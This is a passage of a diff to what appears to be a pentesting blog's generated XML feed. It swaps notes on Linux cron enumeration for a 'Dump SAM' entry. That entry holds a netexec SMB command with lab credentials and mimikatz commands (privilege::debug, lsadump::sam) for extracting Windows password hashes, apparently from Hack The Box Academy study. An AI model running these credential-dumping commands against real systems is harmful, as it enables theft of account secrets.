23)</span></span><br><span class="line"><span class="comment"># |  |  .---------- day of month (1 - 31)</span></span><br><span class="line"><span class="comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span><br><span class="line"><span class="comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span><br><span class="line"><span class="comment"># |  |  |  |  |</span></span><br><span class="line"><span class="comment"># *  *  *  *  * user-name command to be executed</span></span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /etc/cron.*/</span><br><span class="line"></span><br><span class="line">/etc/cron.d/:</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 1 root root  106  3. Jan 20:27 .</span><br><span class="line">drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..</span><br><span class="line">-rw-r--r-- 1 root root  201  1. Mär 2021  e2scrub_all</span><br><span class="line">-rw-r--r-- 1 root root  331  9. Jan 2021  geoipupdate</span><br><span class="line">-rw-r--r-- 1 root root  607 25. Jan 2021  john</span><br><span class="line">-rw-r--r-- 1 root root  589 14. Sep 2020  mdadm</span><br><span class="line">-rw-r--r-- 1 root root  712 11. Mai 2020  php</span><br><span class="line">-rw-r--r-- 1 root root  102 22. Feb 2021  .placeholder</span><br><span class="line">-rw-r--r-- 1 root root  396  2. Feb 2021  sysstat</span><br><span class="line"></span><br><span class="line">/etc/cron.daily/:</span><br><span class="line">total 68</span><br><span class="line">drwxr-xr-x 1 root root  252  6. Jan 16:24 .</span><br><span class="line">drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>]]></content>
+<p>➜ Dump sam.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam</span><br></pre></td></tr></table></figure>
+<h3 id="Locally"><a href="#Locally" class="headerlink" title="Locally"></a>Locally</h3><h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::sam</span></span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>Active Directory</category>
-        <category>Linux</category>
-        <category>Post Exploitation</category>
-        <category>Credential Hunting</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Dump-Passwords</category>
       </categories>
       <tags>
-        <tag>config-files</tag>
-        <tag>history-file</tag>
-        <tag>db-files</tag>
-        <tag>cronjobs-enumeration</tag>
+        <tag>Dump-SAM</tag>
       </tags>
   </entry>
   <entry>
